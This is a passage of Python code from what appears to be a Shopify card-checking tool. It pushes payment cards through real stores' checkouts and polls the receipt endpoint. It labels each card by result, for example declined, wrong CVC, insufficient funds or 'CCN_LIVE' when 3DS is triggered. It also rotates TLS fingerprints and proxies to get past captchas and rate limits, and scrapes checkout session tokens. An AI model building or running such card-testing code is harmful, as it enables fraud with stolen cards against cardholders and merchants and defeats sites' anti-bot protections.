            'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
            'variables': {
                'receiptId': receipt_id,
                'sessionToken': x_checkout_one_session_token,
            },
            'operationName': 'PollForReceipt',
        }

        for i in range(2):
            # Removed tokenization
            request = await session.post(f'{url}/checkouts/internal/graphql/persisted', params=params, headers=headers, json=json_data, timeout=18)
            if i == 0:
                await asyncio.sleep(1.2)
        
        end = time.time()
        timetaken = end - start
        # print(f"Time taken: {timetaken:.2f}s")

        # Parse receipt response with proper None handling
        if not request or not hasattr(request, 'text') or not request.text:
            output.update({
                "Response": "RECEIPT_EMPTY_RESPONSE",
                "Status": False,
                "Gateway": gateway,
                "Price": total,
            })
            _log_output_to_terminal(output)
            return output
        
        try:
            res_json = json.loads(request.text)
        except (json.JSONDecodeError, TypeError, AttributeError) as e:
            output.update({
                "Response": f"RECEIPT_JSON_ERROR: {str(e)[:50]}",
                "Status": False,
                "Gateway": gateway,
                "Price": total,
            })
            _log_output_to_terminal(output)
            return output
        
        if not res_json or not isinstance(res_json, dict):
            output.update({
                "Response": "RECEIPT_INVALID_DATA",
                "Status": False,
                "Gateway": gateway,
                "Price": total,
            })
            _log_output_to_terminal(output)
            return output
        
        result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')

        # if "shopify_payments" in str(res_json):
        #     return "ORDER_CONFIRMED"
        # if  result  == 'CARD_DECLINED':
        #     return "CARD_DECLINED"
        # elif  result  == 'INCORRECT_NUMBER':
        #     return "INCORRECT_NUMBER ⚠️"
        # elif  result  == 'GENERIC_ERROR':
        #     return "GENERIC_ERROR ⚠️"
        # elif result == 'AUTHENTICATION_FAILED':
        #     return "3DS"
        # elif "FRAUD_SUSPECTED" in str(res_json):
        #     return "FRAUD_SUSPECTED"
        # elif "INCORRECT_ADDRESS" in str(res_json):
        #     return "MISMATCHED_BILLING"
        # elif "INCORRECT_ZIP" in str(res_json):
        #     return "MISMATCHED ZIP"
        # elif "INCORRECT_PIN" in str(res_json):
        #     return "MISMATCHED_PIN"
        # elif "insufficient_funds" in str(res_json):
        #     return "INSUFFICIENT_FUNDS"
        # elif "INSUFFICIENT_FUNDS" in str(res_json):
        #     return "INSUFFICIENT_FUNDS"
        # elif "INVALID_CVC" in str(res_json):
        #     return "INVALID_CVC"
        # elif "INCORRECT_CVC" in str(res_json):
        #     return "INCORRECT_CVC"        
        # if "CompletePaymentChallenge" in str(res_json):
        #     return "3DS REQUIRED"
        # elif result:
        #     return result
        # else:
        #     return "MISMATCHED_BILL" 
        
        # output.update({
        #     "Response": result,
        #     "Status": True,
        #     "Gateway": gateway,
        #     "Price": total,
        #     "cc": card
        # })
        # Safe string conversion for checking
        res_json_str = str(res_json) if res_json is not None else ""
        res_json_str_lower = res_json_str.lower()
        
        if "shopify_payments" in res_json_str:
            output.update({
                "Response": "ORDER_PLACED",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card,
                "ReceiptId": receipt_id
            })
        elif result == 'CARD_DECLINED':
            output.update({
                "Response": "CARD_DECLINED",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card,
                "ReceiptId": receipt_id
            })
        elif result == 'INCORRECT_NUMBER':
            output.update({
                "Response": "INCORRECT_NUMBER",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card,
                "ReceiptId": receipt_id
            })
        elif result == 'GENERIC_ERROR':
            output.update({
                "Response": "GENERIC_ERROR",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card,
                "ReceiptId": receipt_id
            })
        elif result == 'AUTHENTICATION_FAILED':
            output.update({
                "Response": "AUTHENTICATION_FAILED",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card,
                "ReceiptId": receipt_id
            })
        elif "FRAUD_SUSPECTED" in res_json_str:
            output.update({
                "Response": "FRAUD_SUSPECTED",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card,
                "ReceiptId": receipt_id
            })
        elif "INCORRECT_ADDRESS" in res_json_str:
            output.update({
                "Response": "INCORRECT_ADDRESS",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card,
                "ReceiptId": receipt_id
            })
        elif "INCORRECT_ZIP" in res_json_str:
            output.update({
                "Response": "INCORRECT_ZIP",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card,
                "ReceiptId": receipt_id
            })
        elif "INCORRECT_PIN" in res_json_str:
            output.update({
                "Response": "MISMATCHED_PIN",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card,
                "ReceiptId": receipt_id
            })
        elif "insufficient_funds" in res_json_str_lower:
            output.update({
                "Response": "INSUFFICIENT_FUNDS",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card,
                "ReceiptId": receipt_id
            })
        elif "INVALID_CVC" in res_json_str or "INCORRECT_CVC" in res_json_str:
            output.update({
                "Response": "INCORRECT_CVC",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card,
                "ReceiptId": receipt_id
            })
        elif "CompletePaymentChallenge" in res_json_str or "ActionRequiredReceipt" in res_json_str:
            # 3DS / challenge required -> card is live (CCN LIVE)
            output.update({
                "Response": "CCN_LIVE",
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card,
                "ReceiptId": receipt_id
            })
        elif result:
            output.update({
                "Response": result,
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card,
                "ReceiptId": receipt_id
            })
        else:
            # When result is None, check if order was actually successful
            receipt_data = (res_json or {}).get('data', {}).get('receipt', {})
            if receipt_data.get('id') and not receipt_data.get('processingError'):
                # Order likely successful - check for confirmation indicators
                output.update({
                    "Response": "MISMATCHED_BILL",
                    "Status": True,
                    "Gateway": gateway,
                    "Price": total,
                    "cc": card,
                    "ReceiptId": receipt_id
                })
            else:
                output.update({
                    "Response": "UNKNOWN_ERROR",
                    "Status": True,
                    "Gateway": gateway,
                    "Price": total,
                    "cc": card,
                    "ReceiptId": receipt_id
                })


    except Exception as e:
        error_msg = str(e)
        
        # Map common Python errors to user-friendly messages
        if "Expecting value" in error_msg:
            error_msg = "SITE_EMPTY_RESPONSE"
        elif "JSONDecodeError" in error_msg or "json" in error_msg.lower():
            error_msg = "SITE_INVALID_JSON"
        elif "ConnectionError" in error_msg or "Connection" in error_msg:
            error_msg = "SITE_CONNECTION_ERROR"
        elif "Timeout" in error_msg or "timeout" in error_msg.lower():
            error_msg = "SITE_TIMEOUT"
        elif "SSL" in error_msg or "certificate" in error_msg.lower():
            error_msg = "SITE_SSL_ERROR"
        elif "proxy" in error_msg.lower():
            error_msg = "PROXY_ERROR"
        elif len(error_msg) > 60:
            # Truncate long error messages
            error_msg = error_msg[:57] + "..."
        
        output.update({
            "Response": error_msg,
            "Status": False,
        })

    _log_output_to_terminal(output)
    return output


# ==================== CAPTCHA-AWARE WRAPPER ====================

TLS_CLIENT_IDS = ["chrome_120", "chrome_124", "firefox_120", "chrome_117", "safari_16_0"]


async def autoshopify_with_captcha_retry(
    url: str,
    card: str,
    session: TLSAsyncSession,
    max_captcha_retries: int = 5,
    proxy: Optional[str] = None,
) -> dict:
    """
    Wrapper for autoshopify with captcha retry: TLS fingerprint rotation
    and exponential backoff. Products fetch uses cloudscraper fallback on captcha.
    """
    captcha_attempts = 0
    last_result = None
    
    http429_retries = 0
    max_429_retries = 2
    
    while captcha_attempts < max_captcha_retries:
        use_session = session
        if captcha_attempts > 0:
            try:
                # Use BulletproofSession for better reliability
                use_session = BulletproofSession(
                    timeout_seconds=90,
                    proxy=proxy,
                    use_playwright=False,  # Disable Playwright for mass requests (too heavy)
                )
            except Exception:
                use_session = session
        
        # Ensure session is used as context manager
        if use_session is not session:
            async with use_session:
                result = await autoshopify(url, card, use_session, proxy=proxy)
        else:
            result = await autoshopify(url, card, use_session, proxy=proxy)
        
        last_result = result
        response = str(result.get("Response", "")).upper()
        is_captcha = any(x in response for x in [
            "CAPTCHA", "HCAPTCHA", "RECAPTCHA", "CHALLENGE",
            "CAPTCHA_METADATA_MISSING", "SITE_CAPTCHA", "CART_HTML", "HCAPTCHA_DETECTED"
        ])
        is_429 = "HTTP_429" in response or "NEGOTIATE_HTTP_429" in response or "CHECKOUT_HTTP_429" in response
        
        if not is_captcha and not is_429:
            return result
        
        if is_429 and http429_retries < max_429_retries:
            http429_retries += 1
            logger.info(f"HTTP 429 on attempt {http429_retries}/{max_429_retries} for {url}, backing off")
            await asyncio.sleep(2.5 + http429_retries * 1.0)
            continue
        
        if is_captcha:
            captcha_attempts += 1
            logger.info(f"Captcha on attempt {captcha_attempts}/{max_captcha_retries} for {url}")
            if captcha_attempts < max_captcha_retries:
                await asyncio.sleep(0.6 + captcha_attempts * 0.25)
            continue
        return result
    
    if last_result:
        last_result["Response"] = f"CAPTCHA_MAX_RETRIES ({max_captcha_retries})"
    return last_result or {"Response": "CAPTCHA_UNRESOLVED", "Status": False}


def is_captcha_response(response: str) -> bool:
    """Check if a response indicates captcha detection."""
    response_upper = str(response).upper()
    captcha_patterns = [
        "CAPTCHA", "HCAPTCHA", "RECAPTCHA", "CHALLENGE",
        "CAPTCHA_METADATA_MISSING", "BOT_DETECTION", "VERIFY"
    ]
    return any(pattern in response_upper for pattern in captcha_patterns)


def is_real_card_response(response: str) -> bool:
    """
    Check if response is a real card result (not captcha/site error).
    Real responses include: charged, declined, CCN issues
    """
    response_upper = str(response).upper()
    
    # Real card responses
    real_patterns = [
        # Success
        "ORDER_PLACED", "CHARGED", "SUCCESS", "THANK_YOU", "COMPLETE",
        # CCN (card valid, CVV issue)
        "3DS", "AUTHENTICATION", "INCORRECT_CVC", "INVALID_CVC",
        "INCORRECT_ZIP", "INCORRECT_ADDRESS", "INSUFFICIENT",
        # Declined
        "DECLINED", "GENERIC_DECLINE", "DO_NOT_HONOR", "EXPIRED",
        "INVALID_NUMBER", "LOST", "STOLEN", "FRAUD", "RESTRICTED"
    ]
    
    return any(pattern in response_upper for pattern in real_patterns)


def is_site_error_response(response: str) -> bool:
    """Check if response is a site error (should retry with different site)."""
    response_upper = str(response).upper()
    
    site_error_patterns = [
        "SITE_", "CART_ERROR", "CART_HTML", "CART_CREATION",
        "SESSION_ERROR", "SESSION_INVALID", "TIMEOUT", "CONNECTION",
        "RATE_LIMIT", "BLOCKED", "PROXY_ERROR", "NO_AVAILABLE_PRODUCTS"
    ]
    
    return any(pattern in response_upper for pattern in site_error_patterns)


async def run_shopify_checkout_diagnostic(
    url: str, session, proxy: Optional[str] = None
) -> dict:
    """
    Run Shopify gate flow up to checkout page and collect parsing/debug info.
    Returns a dict with steps: low_product, products, cart_add, checkout_url,
    checkout_page (status, length, snippet), token_presence, robust_tokens,
    regex_session_tests, capture_session_tests, capture_source_tests, etc.
    Used by /testsh to write a debug file.
    """
    parsed = urlparse(url)
    domain = parsed.netloc if parsed and parsed.netloc else (url.split("//")[-1].split("/")[0] if "//" in url else url)
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    else:
        url = f"https://{domain}"
    out = {
        "url": url,
        "domain": domain,
        "step1_low_product": {},
        "step2_products": {},
        "step3_cart_add": {},
        "step4_checkout_url": None,
        "step5_checkout_page": {},
        "step6_token_presence": {},
        "step7_robust_tokens": {},
        "step8_regex_session_tests": [],
        "step9_capture_session_tests": [],
        "step10_capture_source_tests": [],
        "checkout_text_length": 0,
        "error": None,
    }
    headers = {
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.9",
    }
    product_id, price = None, None
    try:
        low_product = await _fetch_low_product_api(domain, session, proxy)
        out["step1_low_product"] = {
            "success": bool(low_product),
            "variantid": low_product.get("variantid") if low_product else None,
            "price": low_product.get("price") if low_product else None,
            "error": None if low_product else "No data",
        }
        if low_product and low_product.get("variantid") is not None:
            product_id = low_product["variantid"]
            price = low_product.get("price", 0.0)
    except Exception as e:
        out["step1_low_product"] = {"success": False, "error": str(e)}
    if not product_id:
        try:
            req = await session.get(f"{url}/products.json", headers=headers, follow_redirects=True, timeout=25)
            sc = getattr(req, "status_code", 0)
            txt = (getattr(req, "text", None) or "").strip()
            out["step2_products"] = {"status_code": sc, "response_length": len(txt), "is_json": txt.startswith("{")}
            if sc == 200 and txt.startswith("{"):
                try:
                    product_id, price = get_product_id(req)
                except ValueError as ve:
                    out["step2_products"]["parse_error"] = str(ve)
        except Exception as e:
            out["step2_products"] = {"error": str(e)}
    else:
        out["step2_products"] = {"skipped": True, "reason": "product_id from low_product"}
    if not product_id:
        out["error"] = "No product_id (low_product and products.json failed)"
        return out
    checkout_url = None
    try:
        add_resp = await session.post(
            f"{url.rstrip('/')}/cart/add.js",
            headers={
                "User-Agent": get_random_user_agent(),
                "Content-Type": "application/json",
                "Origin": url.rstrip("/"),
                "Referer": url.rstrip("/") + "/",
                "Accept": "*/*",
            },
            json={"items": [{"id": product_id, "quantity": 1}]},
            timeout=18,
        )
        add_sc = getattr(add_resp, "status_code", 0)
        out["step3_cart_add"] = {"status_code": add_sc, "success": add_sc == 200}
        await asyncio.sleep(0.5)
        ch_post = await session.post(
            f"{url.rstrip('/')}/checkout",
            headers={
                "User-Agent": get_random_user_agent(),
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": url.rstrip("/"),
                "Referer": url.rstrip("/") + "/",
                "Accept": "*/*",
            },
            data="",
            timeout=18,
            follow_redirects=False,
        )
        post_sc = getattr(ch_post, "status_code", 0)
        if post_sc in (301, 302, 303, 307, 308):
            loc = (getattr(ch_post, "headers", None) or {}).get("location") or (getattr(ch_post, "headers", None) or {}).get("Location") or ""
            if loc:
                if not loc.startswith("http"):
                    loc = urljoin(url.rstrip("/") + "/", loc)
                checkout_url = loc
        if not checkout_url:
            checkout_url = url.rstrip("/") + "/checkout"
        out["step4_checkout_url"] = checkout_url
    except Exception as e:
        out["step3_cart_add"] = {"error": str(e)}
        out["step4_checkout_url"] = url.rstrip("/") + "/checkout"
        checkout_url = out["step4_checkout_url"]
    if not checkout_url:
        out["error"] = "No checkout URL"
        return out
    try:
        ch_get = await session.get(
            checkout_url,
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "User-Agent": get_random_user_agent(),
            },
            follow_redirects=True,
            timeout=22,
        )
        ch_sc = getattr(ch_get, "status_code", 0)
        checkout_text = (getattr(ch_get, "text", None) or "").strip()
        out["checkout_text_length"] = len(checkout_text)
        out["step5_checkout_page"] = {
            "status_code": ch_sc,
            "length": len(checkout_text),
            "snippet_first_500": checkout_text[:500] if checkout_text else "",
            "snippet_meta_session": "",
        }
        if checkout_text:
            if "serialized-sessionToken" in checkout_text:
                idx = checkout_text.find("serialized-sessionToken")
                out["step5_checkout_page"]["snippet_meta_session"] = checkout_text[max(0, idx - 20) : idx + 200]
            elif "serialized-session-token" in checkout_text:
                idx = checkout_text.find("serialized-session-token")
                out["step5_checkout_page"]["snippet_meta_session"] = checkout_text[max(0, idx - 20) : idx + 200]
        out["step6_token_presence"] = {
            "serialized-sessionToken": "serialized-sessionToken" in checkout_text,
